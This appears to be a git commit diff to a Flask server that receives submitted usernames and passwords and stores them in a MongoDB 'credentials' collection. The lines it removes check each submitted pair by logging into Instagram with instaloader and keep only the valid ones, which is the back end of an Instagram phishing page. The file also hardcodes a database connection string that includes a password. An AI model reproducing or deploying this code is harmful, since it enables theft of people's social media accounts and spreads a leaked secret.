6bd8bca9ef75e985a8e3ab6178f4540f0e7a0415
jhonmerk <jhonmerk@proton.me>
2024-11-27 09:21:56 -0500

    Update flask_server.py

--- flask_server.py
+++ flask_server.py
@@ -1,5 +1,5 @@
 from flask import Flask, request, render_template, jsonify
-import instaloader
+#import instaloader
 import pymongo
 from pymongo import MongoClient
 
@@ -9,17 +9,6 @@ app = Flask(__name__)
 client = MongoClient("mongodb+srv://jhonmerk:JonDeere123!?@cluster0.kpdju.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
 db = client.mydatabase
 collection = db.credentials  # Colección donde se almacenarán las credenciales
-
-# Función para comprobar las credenciales de Instagram
-def check_instagram_credentials(email, password):
-    loader = instaloader.Instaloader()
-    try:
-        loader.login(email, password)  # Intentar iniciar sesión
-        return True
-    except instaloader.exceptions.BadCredentialsException:
-        return False
-    except Exception as e:
-        return False
 
 # Ruta para la página principal
 @app.route('/')
@@ -31,14 +20,6 @@ def index():
 def submit():
     username = request.form['username']
     password = request.form['password']
-
-    # Validar las credenciales con Instaloader
-    if check_instagram_credentials(username, password):
-        # Si las credenciales son válidas, guardarlas en la base de datos
-        collection.insert_one({"username": username, "password": password})
-        return jsonify({"message": "Credenciales válidas y almacenadas en la base de datos."})
-    else:
-        return jsonify({"error": "Credenciales incorrectas"}), 400
 
 #if __name__ == '__main__':
  #   app.run(port=5001)
